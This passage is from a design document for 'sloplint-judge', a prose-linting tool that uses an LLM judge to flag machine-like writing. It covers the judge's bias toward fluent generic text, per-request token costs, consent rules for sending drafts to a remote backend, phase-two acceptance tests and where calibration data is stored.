The judge trades substance for fluency when it cannot read the content. In the RAID abstracts, the human passages it rejected were non-native or dense specialist prose, and the model passages it preferred were smooth, generic and said less. A plain-prose editor who does not know the field picks the paragraph they can follow.

Consequences:

- `check` writes no text, and nothing in phase one does.
- A `no-news` or `names-nothing` note at low confidence is read as "the judge did not understand the claim", and the phase-two rewrite loop applies strict drift to that sentence. A claim the judge cannot read is not one it is allowed to simplify.
- Every rationale says the judgment is about the reader's experience of the prose, not the truth or completeness of the claim.

## Cost and speed

Measured against Jev. Other backends report their own numbers through `script/calibrate`.

| request | input tokens | wall time |
|---|---|---|
| five paragraph rules, one paragraph | ~1,600 | ~500 ms |
| six sentence rules, one sentence | ~1,960 | ~500 ms |
| compare, sentence pair with paragraph context | ~590 | ~500 ms |
| compare, paragraph pair | ~800 | ~500 ms |

A 2,000-word design document with forty paragraphs and a quarter of them flagged runs about 40 paragraph requests and 50 sentence requests: roughly 160,000 input tokens and 6 seconds at eight in parallel. With `--strict` the sentence side runs everywhere and the cost roughly triples. At TypeSafe's public price, $42 per billion input tokens with output tokens free, that document is about $0.007, and `check` writes the figure into the `judge` block and onto stderr.

## Agent-first help text

As in sloplint, `--help` leads with the copy-paste recipe, and sloplint's own `--help` carries the judge's part of it when the gem is on the load path: run `status`, ask the person, then `--judge`; when the gem is absent it says so and names the install command. The `check` skill decides whether the judge runs, and it is the person's decision, not the key's. A key set for some other tool must not send a draft to TypeSafe on its own. The skill runs `sloplint-judge status`, which says whether a key exists in the environment or the keychain without reading it; if one does, and the request did not already ask for the judge or refuse it, the skill asks once per conversation, naming where the text goes and what it costs, and stays offline without a yes. If the command then exits 2 because the judge is not installed after all, it runs plain `check` and says so. The report always says when text left the machine. On the command line `--judge` is the consent: a person typed the flag.

```
ruby "${CLAUDE_PLUGIN_ROOT}/exe/sloplint" check --judge --markdown -o json PATH
```

One command, one document, already in document order, with what the judge spent under `judge`. The skill presents it as it does now, quoting `context` and one sentence from `suggestion`, and never prints rule ids or severities unless asked. It says when the judge did not run (exit 3) in different words from when it found nothing (exit 0), and it names the backend in the report because two runs with two backends are two different opinions.

## Phase two

Each item ships only when its test passes. The tests are stated now so they cannot be lowered later to fit a result.

- **Rewrite loop.** An agent proposes a rewrite for a flagged sentence; `compare --drift` decides. Test: on 200 sentences from the RAID human side, accepted rewrites must not lower the paragraph's `particulars` level, and a person reading 50 accepted rewrites blind must prefer the rewrite in at least 35.
- **Stability, and the `check` confidence bands.** Test: the same 300 paragraphs and 300 sentences scored twice an hour apart, with the flagged set agreeing in at least 90 percent of units at or above `high` confidence. This run is also where the 0.7 and 0.5 bands for `check` get measured on the questions they gate, instead of borrowed from `compare`; if the agreement curve puts the knee somewhere else, the bands move and this document says why. Until this passes, no rule moves from `warning` to `error`.
- **Grounding.** Put the source material (the code, the ticket, the log) in the state and add a noul rule per sentence: does the source support the claim. Test: on 100 sentences with hand-labelled support, the rule at `high` confidence must be right in 90 or more, and the failure mode above must not reappear as a preference for sentences that claim less.
- **Per-register severity.** A rule that separates in news and not in abstracts should not carry the same severity in both. Test: run every register on the list against the generated current-model side; a rule carries `warning` in a register only where the model scores higher in under 0.45 of pairs, and `info` there otherwise. `throat-clearing` would then be `warning` in engineering prose and news and `info` in abstracts, instead of `info` everywhere.
- **Recorded fixtures.** The live fixture spec is slow and needs a key. Test: a recorded run of every fixture that replays offline and fails when a rule's question text changes, so an edited question cannot ride on a stale recording.
- **The install test after publishing.** `gem install sloplint sloplint-judge` on a machine without the repository, then `sloplint check --judge` on a document, reports the token counts, the cost and the backend name. CI does the same from the built gems in a scratch `GEM_HOME`, without a key, so the exit-2 path is what it covers.

## Relationship to reader-test

reader-test is a separate skill: per document, a four-slot reader definition, triage from whole document to section to sentence, and house-rule nouls written for that one document. sloplint-judge is a catalog of rules that hold across documents, run the way sloplint is run. The two share a backend adapter and `Sloplint::Split`, not a job. reader-test asks what one named reader experiences on this page; sloplint-judge asks the questions that have been shown to rank model prose below human prose, and reports where they fire. reader-test's machine-detection question is the guard this spike showed fails backwards and should not be relied on.

## Provenance

Same rules as sloplint, same repository. Nothing read or generated during calibration is committed: not RAID, not the current-model text generated from RAID's prompts. All of it lives under the ignored `.corpus/` directory that `script/probe-raid fetch` already owns, and `script/calibrate` reuses it. Fixtures are synthetic. The numbers a run produces, and the names of the models on each side, go in the commit message that adds or changes a rule; this document keeps only the numbers that decide a severity or a caveat, and the rationale keeps none.
